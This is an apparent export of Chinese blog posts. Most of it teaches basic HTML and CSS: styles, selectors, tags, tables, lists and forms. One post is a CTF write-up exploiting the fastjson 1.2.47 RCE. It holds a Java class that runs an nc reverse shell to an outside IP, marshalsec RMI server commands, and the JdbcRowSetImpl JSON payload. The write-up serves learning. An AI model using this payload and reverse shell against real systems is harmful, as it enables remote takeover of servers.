<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">a</span> &#123; <span class="comment">/* 所有的a标签都是这个样式 */</span></span></span><br><span class="line">            color: coral;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>css1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span>&gt;</span>文档内嵌CSS超链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>​    <strong>注意上面head下面的style标签，它是内嵌到了文档中，它定义了所有a标签的样式</strong></p>
</li>
<li><p>使用外部样式表</p>
<ul>
<li><p>新建一个a.css文件</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">37</span>, <span class="number">0</span>, <span class="number">139</span>);</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在HTML文件中引入上文的a.css</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"a.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>css1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ol>
<p>   这三种样式是有优先级的，记住他们的优先级：元素内联式 &gt; 文档内嵌式 &gt; 外部式，但是文档内嵌式&gt;外部式有一个前提：文档内嵌式css样式的位置一定在外部式的后面。<br>   其实总结来说，就是–就近原则（离被设置元素越近优先级别越高）。<br>   但注意上面所总结的优先级是有一个前提：元素内联式 、文档内嵌式 、外部式是在的相同权值的情况下。</p>
<h2 id="CSS基本选择器"><a href="#CSS基本选择器" class="headerlink" title="CSS基本选择器"></a>CSS基本选择器</h2><ul>
<li><p>选择所有元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style 元素:*&#123;&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>根据类型选择元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style 元素:a&#123;&#125;</span><br><span class="line">body元素:&lt;a&gt;博客链接&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>根据类选择元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style 元素:.class_test&#123;&#125;</span><br><span class="line">body元素:&lt;a class &#x3D; &quot;class_test&quot;&gt;博客链接&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>根据ID选择元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style 元素:#id_test&#123;&#125;</span><br><span class="line">body元素:&lt;a id &#x3D; &quot;id_test&quot;&gt;博客链接&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>根据属性选择元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style 元素:[href]&#123;&#125;</span><br><span class="line">body元素:&lt;a href &#x3D; &quot;https:&#x2F;&#x2F;yalexin.gitee.io&#x2F;&quot;&gt;博客链接&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>:选择器动作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">style 元素:a:hover&#123;&#125;</span><br><span class="line">body元素:&lt;a&gt;博客链接&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<p><strong>说明:</strong>选择器仅出现在文档内嵌或者外部样式中。</p>
<p><strong>ID选择元素与类选择元素：</strong></p>
<ul>
<li>共同点：都可以作为选择器，改变属性外面的元素的样式。</li>
<li>不同点：ID选择器又叫做唯一选择器，ID是元素的一个唯一标识，即主键。即在网页中次ID属性值确保只出现一次，不能重复出现。类属性可以多次使用，用户根据需要，将部分具有某种特征的元素集合归为一类，可将该类元素表现出同一效果，比如说id=apple1的苹果、id=apple2的苹果，id=banana1的香蕉、id=banana2的香蕉，它们都同属于水果类，可以根据需要设置它们的class=fruit。</li>
</ul>
<h2 id="控制背景"><a href="#控制背景" class="headerlink" title="控制背景"></a>控制背景</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.class_test</span> &#123;</span><br><span class="line">    <span class="attribute">background-attachment</span>:local;<span class="comment">/* 固定方式 */</span></span><br><span class="line">    <span class="attribute">background-size</span>: auto;</span><br><span class="line">    <span class="attribute">background-repeat</span>: no-repeat;<span class="comment">/* 重复方式 */</span></span><br><span class="line">    <span class="attribute">background-color</span>: brown;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(hello.png);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>CSS基础</tag>
      </tags>
  </entry>
  <entry>
    <title>html语法一</title>
    <url>/2020/03/07/html%E8%AF%AD%E6%B3%951/</url>
    <content><![CDATA[<h2 id="最简单的meno"><a href="#最简单的meno" class="headerlink" title="最简单的meno"></a>最简单的meno</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span><span class="comment">&lt;!-- 文档中html开始的部分 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="comment">&lt;!-- 提供有关文档内容和标注信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span><span class="comment">&lt;!-- 编码 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        hello world</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span><span class="comment">&lt;!-- 文档中html的结束 --&gt;</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>HTML常用的标签分为：行标签和块标签：</p>
<ul>
<li>行标签： 在一行内显示、不可以进行宽高的数值设定； </li>
<li>块标签： 独自占领一行、可以进行宽高的数值的设定； </li>
</ul>
<p>先介绍行标签</p>
<h2 id="行标签"><a href="#行标签" class="headerlink" title="行标签"></a>行标签</h2><h3 id="超链接标签"><a href="#超链接标签" class="headerlink" title="超链接标签"></a>超链接标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span>&gt;</span>博客链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="comment">&lt;!-- URL外部链接 --&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="加粗标签"><a href="#加粗标签" class="headerlink" title="加粗标签"></a>加粗标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>加粗<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="comment">&lt;!-- 加粗标签 --&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="斜体标签"><a href="#斜体标签" class="headerlink" title="斜体标签"></a>斜体标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span>斜体<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="comment">&lt;!-- 斜体标签 --&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="下划线标签"><a href="#下划线标签" class="headerlink" title="下划线标签"></a>下划线标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">u</span>&gt;</span>下划线<span class="tag">&lt;/<span class="name">u</span>&gt;</span><span class="comment">&lt;!-- 下划线标签 --&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="中划线标签"><a href="#中划线标签" class="headerlink" title="中划线标签"></a>中划线标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">s</span>&gt;</span>中划线<span class="tag">&lt;/<span class="name">s</span>&gt;</span><span class="comment">&lt;!-- 中划线标签 --&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="图片标签"><a href="#图片标签" class="headerlink" title="图片标签"></a>图片标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"hello.png"</span> <span class="attr">width</span>=<span class="string">"50px"</span>&gt;</span><span class="comment">&lt;!-- width/height只设置其中之一的时候，会按照原比例自动缩放 --&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="块标签"><a href="#块标签" class="headerlink" title="块标签"></a>块标签</h2><h3 id="div标签"><a href="#div标签" class="headerlink" title="div标签"></a>div标签</h3><p> 划分块的主要使用标签<br> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 文档中html开始的部分 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 提供有关文档内容和标注信息 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span><span class="comment">&lt;!-- 编码 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1px"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 行 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>第一个表头<span class="tag">&lt;/<span class="name">th</span>&gt;</span> <span class="comment">&lt;!-- 表头 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>第二个表头<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>第三个表头<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 第二行 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- 单元格 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- 单元格 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- 单元格 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span><span class="comment">&lt;!-- 文档中html的结束 --&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="单元格合并"><a href="#单元格合并" class="headerlink" title="单元格合并"></a>单元格合并</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"2"</span>&gt;</span>行合并的单元格<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- 单元格 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">"2"</span>&gt;</span>列合并单元格<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- 单元格 --&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用单元格合并时，被合并的地方的单元格要相应地删去</p>
<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><ul>
<li><p>有序列表</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">"1"</span>&gt;</span><span class="comment">&lt;!-- type指定序号样式，默认是十进制阿拉比数字。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">"A"</span>&gt;</span><span class="comment">&lt;!-- 嵌套 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第三<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li><p>无序列表</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">"A"</span>&gt;</span><span class="comment">&lt;!-- 嵌套 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第三<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>html基础</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson 1.2.47 RCE漏洞--Java Fastjson Unserializey题解</title>
    <url>/2022/08/02/fastjson-1-2-47-RCE%E6%BC%8F%E6%B4%9E-Java-Fastjson-Unserializey%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>打开场景后扫描器扫不出任何可疑路径，但是使用burp抓包，获取响应包的时候获得了一个<code>source.zip</code>的源码，打开后发现，是一个使用<code>Spring Boot</code>搭建的项目，同时使用了<code>fastjson</code>，而且该版本存在<code>RCE</code>漏洞（远程代码执行）！</p>
<p>漏洞成因这里就不展开细讲（<del>主要是我也讲不会！</del>），这里只讲怎么利用该漏洞反弹<code>shell</code></p>
<a id="more"></a>

<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><table>
<thead>
<tr>
<th>主机</th>
<th>IP</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>Ubuntu 虚拟机</td>
<td>114.67.175.224</td>
<td>靶机，运行web项目，该项目中使用了存在漏洞版本的<code>fastjson</code></td>
</tr>
<tr>
<td>cetos7 虚拟机</td>
<td>175.178.153.72（公网IP）</td>
<td>搭建web环境（提供恶意Java字节码文件）和RMI服务，nc接收反弹shell；安装好git、maven、jdk1.8，python、nc</td>
</tr>
<tr>
<td>win 11 物理机</td>
<td>—</td>
<td>使用Postman 发送POC</td>
</tr>
</tbody></table>
<h3 id="搭建RMI服务"><a href="#搭建RMI服务" class="headerlink" title="搭建RMI服务"></a>搭建RMI服务</h3><p>由centos7主机完成该工作。</p>
<p>这里借用<code>marshalsec</code>工具，先在<code>GitHub</code>上面下载相关代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/RandomRobbieBF/marshalsec-jar</span><br></pre></td></tr></table></figure>

<p>使用<code>maven</code>构建包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd marshalsec</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>

<p>然后准备以下恶意代码文件<code>TouchFile.java</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TouchFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String commands = <span class="string">"nc 175.178.153.72 4444 -e /bin/sh"</span>;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>将来靶机中会执行<code>commands</code>中的命令，<code>175.178.153.72</code>是我将来接受反弹<code>shell</code>的地址。</p>
<p>然后编译该文件成字节码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">javac TouchFile.java</span><br></pre></td></tr></table></figure>

<p>然后使用<code>python</code>搭建web服务，使得外网能够访问该字节码文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 1234</span><br></pre></td></tr></table></figure>

<blockquote>
<p>phthon2: python -m SimpleHTTPServer 1234</p>
</blockquote>
<p>使用外网能够访问该文件，则说明web服务搭建完毕：</p>
<p><img src="https://cdn.yalexin.top/image-20220802082146840.png" alt="image-20220802082146840"></p>
<p><strong>注意：</strong>防火墙记得放开该端口，并且如果你搭建web服务的主机是像腾讯云一样的服务商提供的，还要到控制台放开该端口。</p>
<p>开始运行<code>RMI</code>服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://175.178.153.72:1234/#TouchFile" 9988</span><br></pre></td></tr></table></figure>

<h3 id="nc开启监听窗口"><a href="#nc开启监听窗口" class="headerlink" title="nc开启监听窗口"></a>nc开启监听窗口</h3><p>由centos7主机完成该工作。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>以上提到的3个端口，均要在防火墙中放开，并且到控制台放开端口。</p>
<h3 id="开始攻击！"><a href="#开始攻击！" class="headerlink" title="开始攻击！"></a>开始攻击！</h3><p>该工作由win11 主机完成，使用Postman发送数据：</p>
<p><img src="https://cdn.yalexin.top/image-20220802083559738.png" alt="image-20220802083559738"></p>
<p><code>json</code>对象为：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://175.178.153.72:9988/TouchFile"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察我们的centos主机，我们发现nc窗口成功获取了靶机的<code>shell</code>：</p>
<p><img src="https://cdn.yalexin.top/image-20220802084111576.png" alt="image-20220802084111576"></p>
<p>下面直接运行命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.yalexin.top/image-20220802083907002.png" alt="image-20220802083907002"></p>
<p>读取<code>flag</code>：</p>
<p><img src="https://cdn.yalexin.top/image-20220802083950974.png" alt="image-20220802083950974"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><code>Fastjson</code>是阿里巴巴推出的，性能还算不错，国内应该很多人使用。但是之前爆过几次反序列化<code>RCE</code>漏洞让无数厂商苦不堪言，怎么说呢，国产软件，任重道远，希望它越来越好吧！</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>fastjson</tag>
        <tag>RCE漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>html语法二</title>
    <url>/2020/03/07/html%E8%AF%AD%E6%B3%95%E4%BA%8C/</url>
    <content><![CDATA[<h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><p>HTML5中，表单是HTML获得用户输入的手段。</p>
<ul>
<li><p>输入类型表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"请输入噢"</span>&gt;</span><span class="comment">&lt;!-- text是单行文本框value是占位符 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入噢"</span>&gt;</span><span class="comment">&lt;!--placeholder是提示内容--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入噢"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span>&gt;</span><span class="comment">&lt;!--maxlength指明输入最大长度--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入噢"</span> <span class="attr">size</span>=<span class="string">"50"</span>&gt;</span><span class="comment">&lt;!--size指明输入框的长度--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"请输入噢"</span> <span class="attr">readonly</span>&gt;</span><span class="comment">&lt;!--readonly指明只读，不可编辑--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"请输入密码噢"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">"10"</span> <span class="attr">cols</span>=<span class="string">"10"</span>&gt;</span> <span class="comment">&lt;!-- 指定行数列数 --&gt;</span></span><br><span class="line">            这是内容</span><br><span class="line">            gh</span><br><span class="line">            h</span><br><span class="line">            j</span><br><span class="line">        <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a></li>
<li><p>按钮类型表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="comment">&lt;!-- value是提交表单时上传到服务器的内容 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"type='button'按钮"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"type='submit'按钮"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>&gt;</span><span class="comment">&lt;!-- 复选框 --&gt;</span></span><br><span class="line">       这是一个复选框</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"choose"</span>&gt;</span>单选1<span class="comment">&lt;!-- 三选一按钮集合 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span 